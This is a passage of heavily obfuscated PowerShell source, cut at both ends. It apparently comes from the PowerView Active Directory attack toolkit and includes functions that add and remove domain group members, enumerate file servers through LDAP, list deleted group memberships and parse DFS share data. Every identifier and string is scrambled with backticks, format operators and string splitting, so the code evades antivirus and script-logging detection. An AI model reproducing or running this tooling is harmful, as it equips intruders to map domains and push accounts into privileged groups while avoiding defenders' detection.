        if (${P`S`B`oUNDp`Ar`AMETeRs}[("{1}{0}{2}" -f 'imeL','ServerT','imit')]) { ${sE`Ar`CHErA`RGUmenTS}[("{0}{4}{3}{1}{2}" -f 'S','eLimi','t','Tim','erver')] = ${sErv`E`RT`iME`limiT} }
        if (${PS`BO`Und`paRAmEt`eRs}[("{1}{2}{0}" -f 'mbstone','T','o')]) { ${s`e`ArCHe`RaRG`UM`Ents}[("{0}{1}{2}" -f 'Tombs','to','ne')] = ${tO`mbsTO`Ne} }
        if (${P`SBOu`ND`PA`RAMeterS}[("{2}{1}{0}"-f 'l','redentia','C')]) { ${Se`ArcH`ER`ARguM`en`TS}[("{3}{0}{1}{2}" -f're','de','ntial','C')] = ${c`Re`dEnT`ial} }
    }

    PROCESS {
        if (${p`SBOun`dPArAMEtE`RS}[("{0}{1}{2}" -f 'Ident','it','y')]) { ${S`EARc`HeraR`gUMeNtS}[("{1}{2}{0}"-f'ity','Id','ent')] = ${I`D`Ent`ItY} }

        &("{2}{3}{4}{0}{1}"-f'inO','bject','G','et-','Doma') @SearcherArguments | &("{2}{1}{0}{3}" -f'jec','orEach-Ob','F','t') {
            ${o`BJec`TDn} = ${_}."PRoPeR`T`I`eS"[("{3}{1}{0}{2}" -f 'gu','stin','ishedname','di')][0]
            ForEach(${xMln`o`DE} in ${_}."PR`OPE`RT`ieS"[("{2}{5}{1}{3}{0}{4}" -f 'da','eplvalu','msd','emeta','ta','s-r')]) {
                ${Tem`p`Ob`JEct} = [xml]${X`MlnODE} | &("{0}{2}{1}" -f'Select-','bject','O') -ExpandProperty ("{2}{0}{3}{1}{4}" -f'_REPL','ALU','DS','_V','E_META_DATA') -ErrorAction ("{3}{1}{2}{4}{0}"-f 'e','entl','yConti','Sil','nu')
                if (${TEmP`Obj`E`CT}) {
                    if ((${tE`MPobjE`CT}."pSzATtRIbUt`E`Na`Me" -Match ("{1}{0}" -f 'er','memb')) -and ((${t`eMPO`BJe`CT}."DWV`ERSi`ON" % 2) -eq 0 )) {
                        ${ouTP`UT} = &("{0}{2}{3}{1}"-f 'Ne','ct','w','-Obje') ("{1}{0}{2}"-f 'SObje','P','ct')
                        ${o`UTpUt} | &("{0}{1}{2}"-f'Add-Me','mb','er') ("{0}{1}{3}{2}" -f 'N','ote','y','Propert') ("{1}{0}{2}"-f 'o','Gr','upDN') ${ob`JeC`TDn}
                        ${O`Ut`put} | &("{0}{2}{1}" -f 'Add-Me','er','mb') ("{1}{0}{2}" -f'rop','NoteP','erty') ("{2}{0}{1}"-f'rD','N','Membe') ${tE`m`PoBject}."pSZO`B`jecTdN"
                        ${ou`TPut} | &("{0}{2}{1}"-f'Add-','er','Memb') ("{1}{2}{0}{3}" -f't','Note','Proper','y') ("{0}{1}{2}"-f 'TimeFirstA','dde','d') ${T`eM`PoBj`EcT}."ftIMe`C`R`EatED"
                        ${out`P`Ut} | &("{2}{1}{0}" -f'mber','e','Add-M') ("{3}{1}{2}{0}"-f'ty','oteProp','er','N') ("{1}{2}{0}"-f 'ed','TimeDe','let') ${T`EmpoBjE`cT}."f`T`imedELETed"
                        ${OU`TpuT} | &("{0}{1}{2}"-f'Ad','d-Membe','r') ("{0}{1}{2}" -f'No','te','Property') ("{2}{0}{1}{3}" -f 'ti','ng','LastOrigina','Change') ${tEMP`O`BJ`ect}."FtIMelastOr`I`GInATI`NgChA`N`ge"
                        ${ouTp`UT} | &("{2}{1}{0}"-f 'er','dd-Memb','A') ("{0}{2}{1}"-f 'No','Property','te') ("{0}{2}{1}" -f'Tim','ded','esAd') (${TeMPo`Bje`CT}."dWv`ErS`IOn" / 2)
                        ${OUT`pUT} | &("{1}{2}{0}" -f'r','Add-','Membe') ("{2}{0}{1}{3}" -f 'teP','rope','No','rty') ("{0}{2}{1}{3}" -f 'LastOrigi','ng','nati','DsaDN') ${t`eMpo`BjEct}."p`sz`last`orIgInatINg`Dsadn"
                        ${o`Ut`put}."Ps`O`BJeCT"."tyPEn`Am`eS".("{1}{0}"-f 't','Inser').Invoke(0, ("{5}{2}{9}{0}{6}{1}{4}{7}{8}{3}{10}" -f 'nG','upM','ie','ete','embe','PowerV','ro','r','Del','w.Domai','d'))
                        ${oUT`Put}
                    }
                }
                else {
                    &("{2}{0}{3}{4}{1}" -f'r','rbose','W','ite-','Ve') ('[Ge'+'t-'+'Domain'+'GroupM'+'emb'+'erDelet'+'e'+'d] '+'E'+'rro'+'r '+'r'+'et'+'rieving'+' '+(('fDTm'+'sds'+'-replv'+'alueme'+'tad'+'a'+'tafDT'+' ')  -crEplaCE 'fDT',[cHAR]39)+'fo'+'r '+"'$ObjectDN'")
                }
            }
        }
    }
}

function add-DO`m`A`INGRoU`PME`MBer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f 'P','PSShoul','d','rocess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSition = 0, MAnDAtory = ${t`RUe})]
        [Alias({"{1}{2}{0}"-f'e','Grou','pNam'}, {"{3}{2}{0}{1}" -f'oupIde','ntity','r','G'})]
        [String]
        ${IdEnt`I`TY},

        [Parameter(maNDaTory = ${tr`Ue}, VALUefRomPiPELInE = ${tR`UE}, ValUEfROMPIPEliNeBypRopErtYNaME = ${Tr`Ue})]
        [Alias({"{2}{3}{0}{1}"-f'Ide','ntity','M','ember'}, {"{0}{1}{2}"-f 'M','embe','r'}, {"{2}{3}{1}{0}" -f 'hedName','s','Disti','ngui'})]
        [String[]]
        ${Memb`E`RS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`Oma`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EDent`IAl} =  ( &("{1}{2}{0}"-f'iaBLe','VA','R') ("{0}{2}{1}"-f 'Pk','Zn','fe'))."VAL`Ue"::"e`MpTY"
    )

    BEGIN {
        ${COn`TE`XTARGuMEn`Ts} = @{
            ("{1}{2}{0}"-f 'tity','I','den') = ${Id`eN`TITY}
        }
        if (${PSB`OUNdpaR`A`me`TerS}[("{0}{1}"-f'Do','main')]) { ${conTExT`A`RguM`en`Ts}[("{1}{0}"-f 'omain','D')] = ${dOM`A`iN} }
        if (${PsBOu`ND`P`A`RA`MeterS}[("{2}{0}{1}" -f 'eden','tial','Cr')]) { ${Co`NtexT`ArgUm`EN`TS}[("{1}{0}{2}"-f 'r','C','edential')] = ${cr`ed`enTIAL} }

        ${GR`O`UpC`oNT`ext} = &("{3}{1}{2}{0}{5}{6}{4}" -f 'cipalCo','i','n','Get-Pr','t','n','tex') @ContextArguments

        if (${gr`OuPc`o`NtexT}) {
            try {
                ${g`ROUp} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{1}{3}{0}{4}{2}" -f 'de','F','ity','indByI','nt').Invoke(${Gr`Ou`PConteXt}."c`oNT`ExT", ${gR`OuP`c`ontE`Xt}."I`De`NtItY")
            }
            catch {
                &("{0}{3}{1}{4}{2}"-f'W','t','-Warning','ri','e') ('['+'A'+'dd-Domai'+'nGroupMe'+'mber'+'] '+'Erro'+'r '+'findin'+'g '+'th'+'e '+'gro'+'up'+' '+'id'+'enti'+'ty '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${g`ROUp}) {
            ForEach (${m`eMbeR} in ${MEm`B`ErS}) {
                if (${mem`Ber} -match ((("{1}{2}{3}{0}"-f '0}.+','.','+','{0}{')) -F[cHaR]92)) {
                    ${coNtEx`TarGUme`N`TS}[("{1}{0}" -f'ty','Identi')] = ${Me`mBer}
                    ${UseRcO`N`Te`Xt} = &("{3}{0}{2}{1}" -f 't-','ontext','PrincipalC','Ge') @ContextArguments
                    if (${uS`E`RCon`TEXT}) {
                        ${u`SerIDenT`i`Ty} = ${User`C`O`Ntext}."ide`N`TItY"
                    }
                }
                else {
                    ${uS`ERco`N`Text} = ${GrOupC`ON`Te`xt}
                    ${Use`RIDen`T`ity} = ${ME`M`BeR}
                }
                &("{0}{2}{1}" -f'Writ','se','e-Verbo') ('['+'Add-Do'+'ma'+'inG'+'roupMember'+']'+' '+'Add'+'ing'+' '+'me'+'mber '+"'$Member' "+'t'+'o '+'gr'+'oup '+"'$Identity'")
                ${m`EMb`er} = [System.DirectoryServices.AccountManagement.Principal]::("{0}{2}{3}{1}" -f 'Fi','tity','n','dByIden').Invoke(${U`SE`Rco`NTEXT}."Co`N`TeXt", ${UsE`RI`De`NT`ItY})
                ${GRO`Up}."M`eMbE`RS".("{0}{1}" -f'Ad','d').Invoke(${M`EMber})
                ${G`Ro`UP}.("{1}{0}" -f'e','Sav').Invoke()
            }
        }
    }
}

function remo`V`e-DOMAi`NGRoUPMeM`BeR {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}"-f 'PSShou','ldProc','ess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(posItiON = 0, MaNDAtOrY = ${t`RuE})]
        [Alias({"{2}{0}{1}" -f 'ou','pName','Gr'}, {"{2}{0}{3}{1}" -f'roup','tity','G','Iden'})]
        [String]
        ${IdE`N`TiTy},

        [Parameter(MAnDaToRy = ${t`Rue}, VAluefrompIpELiNe = ${TR`Ue}, ValUEfRomPipELinebypRopeRtynaMe = ${tr`UE})]
        [Alias({"{3}{0}{1}{2}" -f'embe','r','Identity','M'}, {"{0}{1}"-f 'Me','mber'}, {"{1}{3}{4}{0}{2}"-f 'am','Di','e','stingu','ishedN'})]
        [String[]]
        ${M`e`MbERS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`mAIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`ED`Ential} =  ${pkf`e`ZN}::"e`mPtY"
    )

    BEGIN {
        ${ConTEXTa`R`GU`m`En`Ts} = @{
            ("{1}{2}{0}" -f'tity','Id','en') = ${i`dent`i`TY}
        }
        if (${P`sboUndP`Ar`AmetERs}[("{0}{1}" -f'Do','main')]) { ${cont`E`xTArguM`EnTs}[("{1}{2}{0}"-f 'n','Doma','i')] = ${D`OMA`In} }
        if (${p`Sb`OUndParam`E`TErs}[("{0}{2}{1}" -f 'Cre','l','dentia')]) { ${cO`NTEXta`RguM`eNTS}[("{0}{1}{2}" -f'C','redentia','l')] = ${Cr`EdE`NtI`AL} }

        ${GrOUp`C`O`Nte`XT} = &("{4}{1}{0}{5}{3}{2}" -f'a','ip','t','x','Get-Princ','lConte') @ContextArguments

        if (${gr`Oup`cOnT`eXt}) {
            try {
                ${g`RO`Up} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{2}{0}{1}{3}"-f 'dByIden','tit','Fin','y').Invoke(${g`RoUPco`NteXt}."c`o`NtExT", ${GR`O`U`pCOnteXt}."IdE`N`TitY")
            }
            catch {
                &("{3}{1}{0}{2}{4}" -f 'e-','rit','War','W','ning') ('[Remo'+'ve-Doma'+'i'+'nGro'+'upM'+'emb'+'e'+'r'+'] '+'Erro'+'r '+'fi'+'nding '+'th'+'e '+'g'+'roup'+' '+'ide'+'nti'+'ty '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${g`ROuP}) {
            ForEach (${Me`m`BER} in ${meM`B`eRs}) {
                if (${M`eMBEr} -match ((("{1}{0}" -f '+','.+ncqncq.'))  -creplACe  ([ChAr]110+[ChAr]99+[ChAr]113),[ChAr]92)) {
                    ${coNTEXTarG`UMe`N`Ts}[("{1}{0}{2}" -f'den','I','tity')] = ${M`Emb`er}
                    ${US`ErcONT`Ext} = &("{4}{5}{1}{0}{2}{3}"-f 'cip','in','a','lContext','Ge','t-Pr') @ContextArguments
                    if (${uS`ERconTe`Xt}) {
                        ${u`seRiDE`NTItY} = ${u`SER`C`oNTEXt}."i`dEntitY"
                    }
                }
                else {
                    ${Us`eRCOnT`eXt} = ${grO`Up`Context}
                    ${USE`RidE`N`TITY} = ${MEm`B`eR}
                }
                &("{1}{3}{0}{2}" -f'bo','Write','se','-Ver') ('[Remove'+'-DomainG'+'r'+'oupMember'+']'+' '+'R'+'emoving'+' '+'mem'+'ber'+' '+"'$Member' "+'fr'+'om '+'gro'+'u'+'p '+"'$Identity'")
                ${Me`m`BEr} = [System.DirectoryServices.AccountManagement.Principal]::("{3}{2}{0}{1}" -f 'denti','ty','ByI','Find').Invoke(${Use`Rco`NTe`Xt}."ConT`exT", ${us`E`RiD`EN`TIty})
                ${gRo`Up}."mEM`Be`RS".("{1}{2}{0}" -f 'move','R','e').Invoke(${mE`MBer})
                ${gr`oUp}.("{1}{0}"-f've','Sa').Invoke()
            }
        }
    }
}

function geT-DOMA`Inf`i`leSE`RVer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{1}{3}{0}"-f 'dProcess','ho','S','ul','PS'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( VAlUeFrOmpiPeLINe = ${t`Rue}, valUefROMpIpeLiNeByPROperTYName = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}"-f'Dom','nNam','e','ai'}, {"{1}{0}" -f 'e','Nam'})]
        [String[]]
        ${dO`M`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'ilte','F','r'})]
        [String]
        ${ldApF`iL`Ter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSPat','h'})]
        [String]
        ${s`eArcH`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'inCon','troller','Doma'})]
        [String]
        ${s`eRveR},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{0}"-f'l','OneLeve'}, {"{0}{1}{2}"-f'Su','btr','ee'})]
        [String]
        ${sEa`RC`hs`COpE} = ("{0}{2}{1}" -f 'S','e','ubtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`e`sulTPaGESI`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`VeRtI`mel`iMit},

        [Switch]
        ${TomBS`T`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdeN`Ti`AL} =  ( &("{1}{0}" -f'R','DI')  ('v'+'ar'+'iAblE:Pk'+'FEz'+'N') )."V`ALUe"::"E`MpTy"
    )

    BEGIN {
        function Sp`L`It-PAth {
            Param([String]${PA`Th})

            if (${p`ATh} -and (${P`AtH}.("{0}{1}"-f'spl','it').Invoke('\\')."cOu`Nt" -ge 3)) {
                ${t`EMP} = ${p`AtH}.("{0}{1}" -f 'spli','t').Invoke('\\')[2]
                if (${tE`MP} -and (${te`MP} -ne '')) {
                    ${t`EMp}
                }
            }
        }

        ${SEa`RCH`E`RARGuMeNTs} = @{
            ("{2}{1}{0}"-f 'er','ilt','LDAPF') = (((("{16}{12}{11}{25}{9}{23}{13}{5}{3}{17}{6}{14}{18}{1}{19}{4}{22}{2}{21}{24}{15}{20}{8}{0}{10}{7}" -f'pt','8','f','0.1',':=2','countControl:1.2.84','.','(profilepath=*)))','(scri','063','path=*)','ype=80','T','rAc','1.4','o','(&(samAccount','13556','.','03','medirectory=*)','YK','))(','68)(!(use','(h','53'))  -REPlace'fYK',[char]124))
            ("{2}{1}{0}" -f 'rties','ope','Pr') = ("{2}{6}{1}{3}{5}{4}{0}"-f 'path','ptpath,','homed','p','le','rofi','irectory,scri')
        }
        if (${PsBOUnd`P`A`RA`M`ETERs}[("{0}{2}{1}"-f'Sear','ase','chB')]) { ${s`eaR`cHeR`ARGu`mEntS}[("{0}{1}{2}{3}"-f 'S','ea','rchBas','e')] = ${s`eArCHb`ASe} }
        if (${p`SbOuNDpAra`M`etErs}[("{0}{1}" -f 'Se','rver')]) { ${SEa`R`Chera`RG`UMEntS}[("{0}{1}" -f 'Serve','r')] = ${sER`V`er} }
        if (${p`sB`ounDPaRAme`Ters}[("{1}{3}{2}{0}"-f 'e','Sea','p','rchSco')]) { ${SEARC`HeRaRg`U`ME`NTS}[("{0}{2}{1}"-f 'Search','ope','Sc')] = ${s`earC`hSC`opE} }
        if (${psBoun`DPa`RaM`eTe`Rs}[("{3}{4}{0}{1}{2}" -f 'tPage','S','ize','Res','ul')]) { ${SeArchEraRg`U`M`eN`TS}[("{2}{4}{0}{1}{3}" -f 'u','ltPag','Re','eSize','s')] = ${rEs`Ult`Pa`gesizE} }
        if (${PSb`ouNdpa`RaMe`TERs}[("{2}{4}{0}{3}{1}"-f'verT','Limit','Se','ime','r')]) { ${SEaRCHERAr`Gu`MEn`Ts}[("{2}{3}{0}{1}" -f'rTim','eLimit','Ser','ve')] = ${seRvE`Rt`i`MElim`it} }
        if (${p`sBOUnDPaRa`mEte`RS}[("{0}{1}{3}{2}"-f 'Tom','b','ne','sto')]) { ${Sea`RC`HEr`ArGuMEntS}[("{0}{1}{2}"-f'T','om','bstone')] = ${tom`BST`onE} }
        if (${p`Sb`ouNDParAmeT`e`RS}[("{0}{2}{1}{3}" -f'C','de','re','ntial')]) { ${S`E`A`R`chEra`RgumeNTs}[("{1}{0}{2}"-f'ed','Cr','ential')] = ${cr`Ede`NTiAL} }
    }

    PROCESS {
        if (${PsbOUnDPAR`A`m`eTE`Rs}[("{0}{1}"-f'Doma','in')]) {
            ForEach (${TarGe`T`DOmA`iN} in ${d`O`MAIN}) {
                ${SEARC`heR`ARgu`me`NtS}[("{0}{1}{2}" -f'Dom','a','in')] = ${t`A`R`GEtdOMAin}
                ${U`se`Rse`ArCH`ER} = &("{0}{5}{2}{4}{1}{3}"-f'G','e','Do','r','mainSearch','et-') @SearcherArguments

                $(ForEach(${USer`Res`U`lt} in ${U`s`e`R`seaRCher}.("{1}{0}"-f 'indAll','F').Invoke()) {if (${Use`Rr`ESULt}."prOpE`R`T`ies"[("{1}{2}{0}" -f 'ory','homedirec','t')]) {&("{0}{2}{1}" -f'Spl','ath','it-P')(${usEr`REs`UlT}."PrOP`E`RT`IEs"[("{2}{1}{3}{0}" -f 'y','dir','home','ector')])}if (${Use`R`ReSU`Lt}."ProPE`RT`ieS"[("{0}{1}{2}"-f 'scrip','t','path')]) {&("{1}{0}{2}" -f'plit','S','-Path')(${uS`Err`ESU`LT}."P`RoP`ERTi`es"[("{1}{0}{2}" -f'r','sc','iptpath')])}if (${U`s`ER`RESUlt}."pr`o`PErTIes"[("{3}{1}{2}{0}"-f'epath','of','il','pr')]) {&("{1}{3}{0}{2}" -f '-P','Sp','ath','lit')(${us`e`Rresu`lT}."PrOP`eRt`IeS"[("{1}{0}{2}" -f 'rof','p','ilepath')])}}) | &("{0}{1}{2}{3}"-f'So','rt-O','bjec','t') -Unique
            }
        }
        else {
            ${U`SE`RsearCheR} = &("{1}{2}{3}{0}"-f'her','Ge','t-Dom','ainSearc') @SearcherArguments
            $(ForEach(${uSe`R`ResULT} in ${Use`RSE`A`R`ChEr}.("{2}{0}{1}"-f 'ndAl','l','Fi').Invoke()) {if (${Use`R`R`esulT}."p`R`OP`erTies"[("{4}{3}{2}{0}{1}" -f'c','tory','re','medi','ho')]) {&("{2}{0}{1}"-f'it','-Path','Spl')(${uSE`Rre`sult}."PRO`PeR`TieS"[("{3}{2}{0}{1}" -f'irector','y','med','ho')])}if (${UsE`Rr`esU`Lt}."P`Rop`Er`Ties"[("{1}{0}{2}"-f 'iptpat','scr','h')]) {&("{0}{2}{1}{3}" -f'Sp','Pa','lit-','th')(${uS`ERR`ESULT}."PR`ope`RTies"[("{2}{0}{1}" -f'ptpat','h','scri')])}if (${U`S`Er`RESult}."PrOpER`Ti`Es"[("{1}{2}{0}" -f 'lepath','prof','i')]) {&("{1}{2}{0}" -f 'h','Split-P','at')(${uSE`RRE`S`UlT}."p`ROper`T`IEs"[("{1}{2}{0}" -f 'h','profile','pat')])}}) | &("{0}{1}{2}" -f 'Sort','-Ob','ject') -Unique
        }
    }
}

function get-Do`MA`IND`FSShAre {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}" -f 'ocess','Pr','PSS','hould'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{4}{7}{5}{6}{2}{8}{0}" -f'nts','PSU','si','se','D','rsMoreT','hanAs','eclaredVa','gnme'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}" -f'Ap','vedVerbs','PSUse','pro'}, '')]
    [OutputType({"{3}{1}{8}{5}{7}{4}{0}{6}{2}"-f'tomObj','agement','t','System.Man','ation.PSCus','ut','ec','om','.A'})]
    [CmdletBinding()]
    Param(
        [Parameter( VALuEfROmpIPElINE = ${Tr`Ue}, VAlUEfROMPIPeLineBYprOpERtyNaME = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'Domai','nNam','e'}, {"{1}{0}" -f'me','Na'})]
        [String[]]
        ${d`om`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'AD','SPath'})]
        [String]
        ${sEA`RCh`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}" -f'nControl','Dom','ai','ler'})]
        [String]
        ${se`RVer},

        [ValidateSet({"{0}{1}" -f 'Ba','se'}, {"{0}{1}" -f 'OneLev','el'}, {"{0}{1}"-f'S','ubtree'})]
        [String]
        ${sEaRC`HSc`oPE} = ("{2}{1}{0}"-f 'btree','u','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eS`ULtPAgEs`i`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`RVEr`T`ImELIMit},

        [Switch]
        ${tO`m`BStONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`e`DEnT`IAL} =   (  &("{2}{0}{1}"-f'Ab','Le','geT-VaRI') ('P'+'kFEZn')  -VaLUeON  )::"Emp`TY",

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${VE`R`siOn} = 'All'
    )

    BEGIN {
        ${S`eaRCH`eRarGuM`ENTS} = @{}
        if (${PSBoU`NDPAr`AM`ETERs}[("{2}{0}{1}{3}"-f'r','chB','Sea','ase')]) { ${se`ARC`HERaRg`UMeNTS}[("{1}{2}{0}"-f 'ase','Se','archB')] = ${S`e`ArChbase} }
        if (${p`SbouNdPaRa`me`TerS}[("{1}{0}" -f 'r','Serve')]) { ${S`eA`Rche`RaRg`UmEntS}[("{1}{0}"-f'er','Serv')] = ${SE`RVER} }
        if (${P`SboundparaM`etE`RS}[("{0}{3}{1}{2}" -f 'S','p','e','earchSco')]) { ${SE`Ar`C`HE`RARGUM`Ents}[("{1}{2}{0}{3}" -f 'o','Searc','hSc','pe')] = ${S`ea`RCHs`COpE} }
        if (${PsBoU`Nd`pa`RaMete`RS}[("{3}{0}{2}{1}" -f 'tPa','Size','ge','Resul')]) { ${SearChERar`GUM`E`NTS}[("{0}{2}{3}{1}" -f'R','ize','esultPag','eS')] = ${rESULt`P`AG`esize} }
        if (${ps`B`O`U`NdpARa`meTerS}[("{2}{1}{0}"-f'TimeLimit','erver','S')]) { ${SeArcHER`ARG`UM`e`NtS}[("{2}{0}{4}{1}{3}"-f 'erverTimeL','mi','S','t','i')] = ${S`E`R`VErT`IMelimIT} }
        if (${P`SbOUN`DpArAME`T`erS}[("{1}{0}"-f'e','Tombston')]) { ${SEaRCH`er`ARGu`MEnTS}[("{2}{3}{0}{1}" -f 'bst','one','To','m')] = ${tOMB`St`oNe} }
        if (${PsB`oUN`DpAR`Am`Ete`Rs}[("{1}{3}{2}{0}" -f 'tial','Cr','den','e')]) { ${SE`ArcHERArgu`m`eN`TS}[("{0}{1}{3}{2}" -f'C','red','al','enti')] = ${cR`EDE`NTI`Al} }

        function P`ArSE`-PKT {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${p`kT}
            )

            ${B`IN} = ${p`kt}
            ${b`LO`B`_VEr`sIon} =  ( &("{0}{2}{1}"-f'G','tem','Et-I') ("{2}{1}{0}{3}" -f 'RiAbLe','A','V',':Q6Rhsu'))."v`Alue"::"tO`UI`NT32"(${B`iN}[0..3],0)
            ${Bl`OB`_`ELe`mEnt`_cOunt} =  (&("{2}{1}{0}" -f'M','iTE','GeT-')  ('v'+'AR'+'iaBle:Q6'+'rh'+'sU')  )."vAL`Ue"::"to`U`iNT32"(${B`In}[4..7],0)
            ${Of`F`SET} = 8

            ${ObJeCt_`L`i`ST} = @()
            for(${i}=1; ${I} -le ${blOb`_`eLEmeNt_`C`OUNT}; ${I}++){
                ${b`Lo`B_NAme`_Si`z`e_sTart} = ${oFf`S`Et}
                ${B`LOb_`N`Ame_SIZE_`eND} = ${OFf`set} + 1
                ${B`L`OB`_`NamE_SIZE} =  ${q6R`HSu}::"tO`UInT`16"(${b`In}[${b`Lob_`Nam`e_si`z`E_`STaRt}..${BLOb_`NaMe`_SI`zE_e`ND}],0)

                ${blOb_`N`Ame_sTA`Rt} = ${BLOb_`N`A`mE_`SIZ`e_End} + 1
                ${blO`B_NA`Me`_ENd} = ${b`L`OB_naME`_s`TARt} + ${blob_`NA`m`E_sizE} - 1
                ${b`LOB_`NAMe} =  (&("{1}{2}{3}{0}"-f'IablE','g','ET-V','Ar') ("{0}{1}" -f 'y','94') -ValUEOnL )::"UNi`COde"."GetS`T`Ring"(${b`In}[${B`lO`B_NaMe_S`TArt}..${BloB`_n`AM`e_`eNd}])

                ${blOB`_`DaT`A_s`I`zE_STArt} = ${B`Lo`B_NaMe_E`Nd} + 1
                ${blOB`_dA`TA_`S`izE_END} = ${B`lOB_daTA_SiZe`_sTa`Rt} + 3
                ${bLOb_DATA`_`s`I`zE} =  ( &("{1}{0}{2}"-f'Et-V','G','arIAbLE')  ("{0}{1}{2}" -f'q','6R','hSU')  )."Va`Lue"::"TOUIn`T32"(${b`In}[${bLoB_`DAt`A_S`I`Ze_STart}..${Blob`_`D`ATa`_siZe`_END}],0)

                ${b`L`Ob_`da`Ta_stART} = ${blOb`_DATA`_SI`zE`_end} + 1
                ${B`LOb_DaT`A_eND} = ${BLo`B_D`ATa_sT`A`RT} + ${BLob_DA`TA_s`iZE} - 1
                ${BL`O`B_da`TA} = ${b`iN}[${B`lOB_`daTa_S`Ta`RT}..${b`LO`B_dAt`A_E`ND}]
                switch -wildcard (${bl`O`B_n`AME}) {
                    ((("{1}{2}{0}{3}"-f 'siter','{0','}','oot'))-F  [cHaR]92) {  }
                    ((("{3}{1}{2}{0}" -f 'ainroot*','}','dom','{0'))-f [ChaR]92) {

                        ${r`OO`T_Or_`LInK`_`guid`_STARt} = 0
                        ${R`O`Ot_OR_LiNk_gU`iD_`E`Nd} = 15
                        ${ROo`T`_`o`R_LiNk_guId} = [byte[]]${bl`O`B_D`AtA}[${ROoT`_`O`R_LiNK`_GUID_st`ARt}..${RoOt_`Or_LInK_`GuiD_`E`Nd}]
                        ${G`UId} = &("{1}{2}{0}" -f't','New-Ob','jec') ("{0}{1}" -f'Gui','d')(,${rOOT`_oR_LI`NK`_`GUiD}) 
                        ${PREFIX_SIz`e_`stA`Rt} = ${rOOT_Or`_Li`NK_GU`I`d`_enD} + 1
                        ${p`Refix_`s`i`ZE_ENd} = ${pr`eFIx_s`iZ`E_st`Art} + 1
                        ${PRefIx`_S`Ize} =  ${Q6`R`HsU}::"TO`UinT`16"(${Bl`ob_DA`Ta}[${pR`e`FIx_s`izE_sTart}..${p`ReF`IX_Si`ZE`_eND}],0)
                        ${p`REfIx`_StARt} = ${preF`ix`_`S`Ize`_enD} + 1
                        ${pR`efix`_`EnD} = ${p`Re`FI`x_st`Art} + ${P`REFIX`_`SiZE} - 1
                        ${p`R`eFix} =  (  &("{1}{0}{2}{3}" -f 'ET-VA','g','RiAB','Le')  ("{1}{0}" -f '94','Y')  -valueonl)::"u`Ni`Code"."gEtSTR`i`NG"(${BL`O`B_`dAta}[${Pr`EfI`X_S`TaRT}..${pREfi`x_E`ND}])

                        ${S`HoRt`_pR`E`F`ix`_SiZe_sTart} = ${Pre`FiX_`ENd} + 1
                        ${s`HorT`_PREf`i`x_siZ`e_`ENd} = ${sh`oRT_P`R`efiX_`SIze_s`TArt} + 1
                        ${s`hort_PR`EF`iX_`SIZe} =   ${Q6r`HSu}::"to`UiN`T16"(${bL`oB_da`Ta}[${S`hOrt_`PRe`F`IX`_SIze_St`ART}..${ShOrT_PrEF`iX_siZ`E`_`e`Nd}],0)
                        ${sHoRt_preF`IX`_stA`RT} = ${shO`RT_preF`IX_`SI`ze_`eNd} + 1
                        ${S`hO`Rt_pr`efIX_E`Nd} = ${SHO`Rt`_PReFI`x_st`A`RT} + ${shORt_pR`e`Fix`_SiZe} - 1
                        ${SHOR`T_`pReFiX} =  (  &("{1}{3}{0}{2}"-f'bL','gEt-Var','E','IA') ("{1}{0}" -f '94','y')  -vALueoN )::"Un`ICodE"."Ge`T`stRiNg"(${b`lOB_`DaTA}[${S`HOrT_preF`iX_`start}..${shORt`_`PrEf`I`x_`END}])

                        ${TYpE_sT`A`RT} = ${sH`O`Rt_PR`EfIx_eND} + 1
                        ${TY`Pe`_eND} = ${tY`Pe_`stArt} + 3
                        ${tY`PE} =  ${Q`6RhSU}::"To`Ui`Nt32"(${BlOb`_DA`TA}[${TyPe_`Sta`RT}..${TY`pe_`eND}],0)

                        ${StAtE`_ST`ARt} = ${T`y`pe_eNd} + 1
                        ${S`Tate_`EnD} = ${St`A`TE_sta`Rt} + 3
                        ${s`TATe} =   ${Q6RH`sU}::"tO`UiN`T32"(${b`lOb_d`ATa}[${S`TATE_`st`Art}..${stat`E_e`ND}],0)

                        ${c`Om`mEnT`_SIZE_`ST`A`Rt} = ${st`A`TE_EnD} + 1
